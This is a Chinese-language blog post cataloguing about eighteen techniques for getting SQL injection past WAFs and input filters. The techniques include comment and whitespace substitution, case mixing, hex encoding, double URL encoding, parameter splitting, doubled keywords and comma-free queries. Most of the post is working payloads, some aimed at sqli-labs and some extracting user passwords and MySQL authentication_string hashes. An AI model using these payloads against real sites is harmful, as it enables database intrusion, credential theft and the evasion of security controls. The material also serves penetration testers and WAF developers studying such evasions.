---
layout: post
title: SQL注入绕过一
categories: 网络安全
description: SQL注入绕过
keywords: SQL注入绕过
---

SQL注入绕过技术一

### 1、SQL注入绕过

SQL 注入绕过技术 已经是一个老生常谈的内容了，防注入可以使用某些云 waf加速乐等安全产品，这些产品会自带 waf 属性拦截和抵御 SQL 注入，也有一些产品会在服务器里安装软件，例如 iis 安全狗、d 盾、还有就是在程序里对输入参数进行过滤和拦截 例如 360webscan 脚本等只要参数传入的时候就会进行检测，检测到有危害语句就会拦截。SQL 注入绕过的技术也有许多。但是在日渐成熟的 waf 产品面前，因为 waf 产品的规则越来越完善，所以防御就会越来越高，
安全系统也跟着提高，对渗透测试而言，测试的难度就越来越高了。

### 2、空格字符绕过

在网站的url中有汉字复制出来的时候会有一些`%+xxx`的编码，这些都是防止乱码进行的编码，各种符合也都有各自的编码

在一个url中空格字符`%20`可以替换的有很多种，如下:

```txt
%09 TAB 键（水平）
%0a 新建一行
%0c 新的一页
%0d return 功能
%0b TAB 键（垂直）
%a0 空格
```

这些编码到MySQL里面都是可以当空格用的，甚至一些注释也可以当成空格

```mysql
 /**/   select * from users/*aaaaaaa*/where/*aaaaa*/id=1;
 /*!*/  select * from users/*!50009*/where/*!50009*/id=1;
 
 select * from users where id=1 /*!union*//*!select*/1,2,3,4;
```

可以将空格字符替换成注释` /**/ `，还可以使用` /*!*/`

这里的根据 mysql 版本的内容不注释，比如：

```sql
select * from users /*!50009*//*!where*/id=1;
```

这条语句就可以正常使用，where虽然被注释了，但是是可以运行的。所以`/*!*/`是可以被当成空格用的。ps：在其他数据库中不行，但是在MySQL中可以。这是MySQL为了兼容导致的一个问题，不同版本也有不同的情况，有的版本是50009，有的版本是40001。

### 3、大小写绕过

将 字符串设置为大小写，例如 and 1=1 转成 AND 1=1AnD 1=1，一些的正则写的不严谨，就可以绕过，反正SQL是不区分大小写的。

```sql
select * from users where id=1 UNION SELECT 1,2,3,4;
select * from users where id=1 UniON SelECT 1,2,3,4;
```

一些特殊符号被过滤，可以结合上面的符号替换

```txt
Less-27/?id=9999999' union select 1,(select group_concat(username,password)from users),3 and '1

# 把上面的攻击语句经过符号和大小写替换，成为下面的内容，成功绕过

Less-27/?id=9999999%27%09UniOn%09SeLeCt%091,(SelEct%09group_concat(username,password)from%09users),3%09and%20%271
```

### 4、浮点数绕过

一些匹配机制是校验整型或者字符型的，这个时候使用浮点型就可以绕过了。

```sql
select * from users where id=8E0union select 1,2,3,4;
select * from users where id=8.0union select 1,2,3,4;

# 构建的语句
# sql.php?name=\N'union select user(),\Nfrom users--+
```

这俩效果是一样的

### 5、NULL值绕过

`select \N;`：代表NULL

```sql
select * from users where id=\Nunion select 1,2,3,\N;
select * from users where id=\Nunion select 1,2,3,\Nfrom users;

# 构建的语句
# sql.php?name=\N'union select user(),\Nfrom users--+
```

这俩效果一样

### 6、双引号绕过

如果 waf 拦截过滤单引号的时候，可以使用双引号 在 mysql 里也可以用双引号作为字符串

```sql
select * from users where id='1';
select * from users where id="1";
```

也可以将字符串转换成 16 进制 再进行查询。

```sql
select hex('admin'); # 转换为16进制
select * from users where username='admin';
select * from users where username=0x61646D696E;
```

如果 gpc 开启了，但是注入点是整形 也可以用 hex 十六进制进行绕过

```sql
select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME='users' limit 1),4;

select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4;
```

### 7、添加库名绕过

以下两条查询语句，执行的结果是一致的，但是有些 waf 的拦截规则 并不会拦截[库名].[表名]这种模式。

```sql
select * from users where id=-1 union select 1,2,3,4 from users;
select * from users where id=-1 union select 1,2,3,4 from mysql.users;

# 构建语句
# ?id=' union select 1,(select concat(user,authentication_string)from mysql.user limit 1)
#或者
# ?id=' union select 1,(select group_concat(user,authentication_string)from mysql.user)
```

mysql 中也可以添加库名查询表。例如跨库查询 mysql 库里的 usrs 表的内容。

```sql
select * from users where id=-1 union select 1,2,3,concat(user,authentication_string) from mysql.user;
```

### 8、去重绕过

在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破 waf 拦截，一些waf设置的不是那么严谨，可以用这个破坏正常情况下的语句从而绕过。

```sql
select * from users where id=-1 union distinct select 1,2,3,4 from users;
select * from users where id=-1 union distinct select 1,2,3,version() from users;
```

### 9、反引号绕过

在 mysql 可以使用 `这里是反引号` 绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。

```mysql
insert into users(username,password,email)values('aaa','123456','admin@aaa.com');
insert into users(`username`,`password`,`email`)values('aaa','123456','admin@aaa.com');
```

### 10、脚本语言特性绕过

不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。比如在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值

例如：`id=1%00&id=2 union select 1,2,3`

有些 waf 回去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截。

### 11、逗号绕过

目前有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号

```sql
select * from users where id=1 union select 1,2,3,4;
```

一般会对逗号过滤成空 `select * from users where id=1 union select 1 2 3 4;`这样SQL 语句就会出错。所以 可以不使用逗号进行 SQL 注入。

#### 11.1 字符串截取绕过

不可以使用逗号可以使用`substr`截取字符串

```sql
select(substr(database() from 1 for 1))  # m
# 可以更换1,2,3,4,5... 直到把数据库名字的每个字母获取到，然后拼接成数据库名字
select * from users where id=1 and 'm'=(select(substr(database() from 1 for 1)));
# 可以把m换成十六进制，避免单引号
select * from users where id=1 and 0x6D=(select(substr(database() from 1 for 1)));
```

根据这个原理，构建攻击语句

```txt
?name=a' and 0x6D=(select(substr(database() from 1 for 1)))--+
```

如果`substr`被拦截还可以使用`mid`，这个 mid函数跟 substr 函数功能相同

```sql
select * from users where id=1 and 0x6D=(select(mid(database() from 1 for 1)));
```

#### 11.2 使用join绕过

使用 join 自连接两个表

```sql
# a 和 b 分别是表的别名
union select 1,2 #等价于 union select * from (select 1)a join (select 2)b

# 以下两个的意思一样
select * from users where id=-1 union select 1,2,3,4;
select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c join(select 4)d;

# 攻击语句原理
select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c join(select 4)d;
```

也没有使用逗号，从而绕过 waf 对逗号的拦截。

#### 11.3 like绕过

使用 like 模糊查询 `select user() like '%r%';` 模糊查询成功返回 1 否则返回 0

找到第一个字符后继续进行下一个字符匹配。从而找到所有的字符串 最后就是要查询的内容，这种 SQL 注入语句也不会存在逗号。从而绕过 waf 拦截。

#### 11.4 limit offset  绕过

SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目` limit 0,1`返回条一条记录 如果对逗号进行拦截时，可以使用 `limit 1` 默认返回第一条数据。也可以使用 `limit 1 offset 0 `从零开始返回第一条记录，这样就绕过 waf 拦截了。

### 12、or and xor not  绕过

目前主流的 waf 都会对 `id=1 and 1=2、id=1 or 1=2、id=0 or 1=2id=0 xor 1=1 limit 1 、id=1 xor 1=2`对这些常见的 SQL 注入检测语句进行拦截。像 and 这些还有字符代替字符如下

```txt
and 等于&&
or 等于 ||
not 等于 !
xor 等于|
所以可以转换成这样
id=1 and 1=1 等于 id=1 && 1=1
id=1 and 1=2 等于 id=1 && 1=2
id=1 or 1=1 等于 id=1 || 1=1
id=0 or 1=0 等于 id=0 || 1=0
```

可以绕过一些 waf 拦截继续对注入点进行安全检测

也可以使用运算符号

```txt
id=1 && 2=1+1
id=1 && 2=1-1
```

ps：`&&`在url中会有问题，需要编码为`%26%26`

### 13、ascii 字符对比绕过

许多 waf 会对 union select 进行拦截 而且通常比较变态，那么可以不使用联合查询注入，可以使用字符截取对比法，进行突破。

```sql
select substring(user(),1,1);
select * from users where id=1 and substring(user(),1,1)='r';
select * from users where id=1 and ascii(substring(user(),1,1))=114;
```

最好把'r'换成成 ascii 码 如果开启 gpc int 注入就不能用了。

### 14、等号绕过

如果程序会对=进行拦截 可以使用 like rlike regexp或者使用大于号`>`或者小于号`<`

```sql
# 大于号小于号
select * from users where id=1 and ascii(substring(user(),1,1))<115;
select * from users where id=1 and ascii(substring(user(),1,1))>115;

# like rlike
select * from users where id=1 and (select substring(user(),1,1)like 'r%');
select * from users where id=1 and (select substring(user(),1,1)rlike 'r');

# 正则
select * from users where id=1 and 1=(select user() regexp '^r');
select * from users where id=1 and 1=(select user() regexp '^a');
```

### 15、双关键词绕过

有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患。

双关键字绕过（若删除掉第一个匹配的 union 就能绕过）

```txt
id=-1'UNIunionONSeLselectECT1,2,3--+
```

到数据库里执行会变成` id=-1'UNION SeLECT1,2,3--+` 从而绕过注入拦截。

这种需要特定的程序下才可以实现。

### 16、二次编码绕过

有些程序会解析一次编码，防止 SQL 注入，但是 url 两次编码过后，waf 解析一次之后发现没有敏感字了，是不会解码两次进行拦截的。

```txt
-1 union select 1,2,3,4#

第一次转码
%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23

第二次转码
%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33
```

两次编码 GPC 是不会过滤的，所以可以绕过 gpc 字符转义，这样也就绕过了 waf 的拦截。

但是这种需要特定程序，比如第一次解码中间件，然后程序里面还有第二次解码的操作`urldecode`的情况下可以使用这种。

### 17、多参数拆分绕过

一条get请求，有多个参数，但是参数是可控的，但是使用 union select 会被 waf 拦截，那么可以使用参数拆份请求绕过 waf 拦截

```txt
# 正常get请求
?id=1&username=admin

# 修改后的攻击语句
?id=-1'union/*&username=*/select 1,user(),3,4--+
```

如果把攻击语句放到一个参数里面就会被拦截，这样分为两个参数`-1'union/*`和`username=*/select 1,user(),3,4--+`就不会了。

攻击语句进入数据库后变成

```sql
select * from users where id = '-1'union/*'and username=*/select 1,user(),3,4-- '

# 注释的内容不生效
select * from users where id = '-1'union/**/select 1,user(),3,4-- '

# 且注释会解释成一个空格，所以最终到数据库中变成这条语句
select * from users where id = '-1'union select 1,user(),3,4-- '
```

这种攻击的前提是有多个参数并且是可控的。

### 18、使用生僻函数绕过

使用生僻函数替代常见的函数，例如在报错注入中使用 polygon()函数替换常用的 updatexml()函数

```sql
select polygon((select * from (select * from (select @@version) f) x));
```

一些函数会有版本限制，需要注意。
